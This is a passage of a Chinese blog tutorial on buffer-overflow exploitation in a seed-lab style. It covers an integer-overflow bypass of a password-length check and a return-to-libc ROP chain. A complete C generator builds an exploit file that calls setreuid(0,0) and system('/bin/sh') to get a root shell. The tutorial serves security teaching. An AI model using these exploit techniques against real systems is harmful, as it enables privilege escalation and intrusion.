+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">validate_passwd</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">passwd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">passwd_buf</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"> 	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">passwd_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">passwd</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"> 	<span class="k">if</span><span class="p">(</span><span class="n">passwd_len</span> <span class="o">&gt;=</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="n">passwd_len</span> <span class="o">&lt;=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">  		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Valid Password</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">  		<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  		<span class="n">strcpy</span><span class="p">(</span><span class="n">passwd_buf</span><span class="p">,</span><span class="n">passwd</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"> 	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Invalid Password</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">  		<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 	<span class="n">store_passwd_indb</span><span class="p">(</span><span class="n">passwd_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Usage Error:   </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  		<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 	<span class="n">validate_uname</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"> 	<span class="n">validate_passwd</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"> 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>首先按上面的方法，创建root shell的环境变量，并得到其地址为0xbffff293</p>
+<p><img loading="lazy" src="/001/08.png" srcset="/001/08.png, /001/08.png 1.5x, /001/08.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>用与上题相同的方法，通过 gdb 得到字符数组与返回地址间差24个字节。</p>
+<p><img loading="lazy" src="/001/09.png" srcset="/001/09.png, /001/09.png 1.5x, /001/09.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>注意到程序中有对输入字符串的长度进行判断的语句。此时就要利用前文提到的整数溢出：unsigned char 的范围为 [0,255]，只需要使其溢出超过 255 后的值落在条件区间即可。一种简单的方式为在返回地址后补无关字符。</p>
+<p><img loading="lazy" src="/001/10.png" srcset="/001/10.png, /001/10.png 1.5x, /001/10.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>这里在覆盖返回地址后补了 236 个 A，使得字符串总长为 24+4+236=264，溢出后为 264-256=8，正好符合条件。可以看到成功得到了 root shell。</p>
+<h2 id="5-不可执行栈return-to-libc">5. 不可执行栈：Return-to-Libc</h2>
+<p>当开启可执行栈时，我们可以使程序跳转执行提权 shell，但关闭可执行栈后我们就无法这么做了。这时候我们可以通过 ROP（返回导向编程）实现攻击。</p>
+<p>ROP 的原理也比较简单。我们的 C 语言程序运行时都会链接 libc 的库函数，这些库函数的地址都会存放在程序中。我们可以通过将返回地址覆盖到这些库函数的上，达到提权等攻击的目的。</p>
+<p>我们仅需一个题目，即可了解这种攻击方法的原理与过程：</p>
+<h3 id="51-栈溢出例题3">5.1 栈溢出例题3</h3>
+<p>（展开代码以查看漏洞程序）</p>
+<div class="highlight" id="id-8"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cm">/* This program has a buffer overflow vulnerability. */</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* Our task is to exploit this vulnerability */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bof</span><span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">badfile</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">154</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* The following statement has a buffer overflow problem */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="mi">400</span><span class="p">,</span> <span class="n">badfile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">badfile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">badfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;badfile&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bof</span><span class="p">(</span><span class="n">badfile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Returned Properly</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fclose</span><span class="p">(</span><span class="n">badfile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>我们的目标是执行以下四个函数：</p>
+<div class="highlight" id="id-9"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">system</span><span class="p">(</span><span class="s">&#34;echo E421140XX&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">setreuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></span></span></code></pre></div><p>首先老办法：向 badfile 中输入 AAAA，使用 GDB 在 bof 函数的 leave 处设断点，查看栈内元素：</p>
+<p><img loading="lazy" src="/001/11.png" srcset="/001/11.png, /001/11.png 1.5x, /001/11.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>可以看到buffer首地址到返回地址之间的距离为 $41\times 4+2=166$ 个字节。接下来考虑解决题目的要求。</p>
+<p>首先需要介绍构造 ROP 链的相关原理。在前面我们已经知道函数被调用的过程：先将参数压栈，再将返回地址压栈，然后开辟新的栈帧。故设函数入口地址为 $x$，则返回地址为 $x+4$，第一个参数地址则为 $x+8$。</p>
+<p>我们尝试构造这样一个 ROP 链，使得程序能够连续执行给定的四个函数。</p>
+<p>构造的ROP链在栈中存放形式大致如下：</p>
+<p><img loading="lazy" src="/001/12.png" srcset="/001/12.png, /001/12.png 1.5x, /001/12.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>这里的 x 即为原函数（bof）返回地址的位置。可以看到 system 的参数存放在 x+8 的位置。</p>
+<p>我们需要在程序中找一个 pop-ret 的片段作为 rop 链函数的返回地址。例如在第一个 system() 执行完毕后 ret，会弹出 x+4 并跳转其存放的地址，即 pop-ret 的片段。首先执行 pop 弹出 system 的参数，然后执行 ret，跳转到 x+12 存放的地址，即执行 setreuid()。</p>
+<p>使用 <code>objdump –d</code> 命令反汇编漏洞程序，查看程序完整的汇编代码，从中找 pop,ret 片段。</p>
+<p><img loading="lazy" src="/001/13.png" srcset="/001/13.png, /001/13.png 1.5x, /001/13.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>如图，可以使用 0x804856f 作为 pop,ret 弹出一个参数后返回，使用 0x804856e 作为 pop,pop,ret 弹出两个参数后返回。</p>
+<p>定义需要的字符串的环境变量并得到其地址：</p>
+<p><img loading="lazy" src="/001/14.png" srcset="/001/14.png, /001/14.png 1.5x, /001/14.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>并使用 GDB 得到需要的 libc 函数的地址：</p>
+<p><img loading="lazy" src="/001/15.png" srcset="/001/15.png, /001/15.png 1.5x, /001/15.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>使用以下程序生成 badfile：</p>
+<div class="highlight" id="id-10"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">addr</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="mh">0xb7e5f430</span> <span class="p">,</span> <span class="c1">// system()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mh">0x0804856f</span> <span class="p">,</span> <span class="c1">// pop-ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mh">0xbffff688</span> <span class="p">,</span> <span class="c1">// e1=&#34;echo E421140XX&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mh">0xb7f07870</span> <span class="p">,</span> <span class="c1">// setreuid()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mh">0x0804856e</span> <span class="p">,</span> <span class="c1">// pop-pop-ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="mh">0xb7e5f430</span> <span class="p">,</span> <span class="c1">// system()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mh">0x0804856f</span> <span class="p">,</span> <span class="c1">// pop-ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mh">0xbffff67d</span> <span class="p">,</span> <span class="c1">// e2=&#34;/bin/sh&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mh">0xb7e52fb0</span> <span class="p">,</span> <span class="c1">// exit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">12</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">300</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">badfile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">badfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;./badfile&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">166</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cnt</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  	<span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">x</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">fwrite</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">badfile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fclose</span><span class="p">(</span><span class="n">badfile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>编译运行，成功得到 root shell。</p>
+<p><img loading="lazy" src="/001/16.png" srcset="/001/16.png, /001/16.png 1.5x, /001/16.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h2 id="6-地址随机化jmp-esp">6. 地址随机化：JMP ESP</h2>
+<p>如果开启了随机化，我们可以通过将返回地址覆写为 jmp esp，这样程序仍会停留在原先 esp 的位置上。我们紧随其后写入提权 shellcode 即可使实现攻击。</p>
+<p>详细原理和例题先咕着 QwQ。</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-08-04 14:24:08">更新于 2023-08-04&nbsp;</span>
+      </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/posts/vul1/" data-title="漏洞分析：缓冲区溢出" data-hashtags="信息安全,Article"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/posts/vul1/" data-hashtag="信息安全"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/posts/vul1/" data-title="漏洞分析：缓冲区溢出"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/' class="post-tag">信息安全</a><a href='/tags/article/' class="post-tag">Article</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.116.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.18"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line statistics"></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
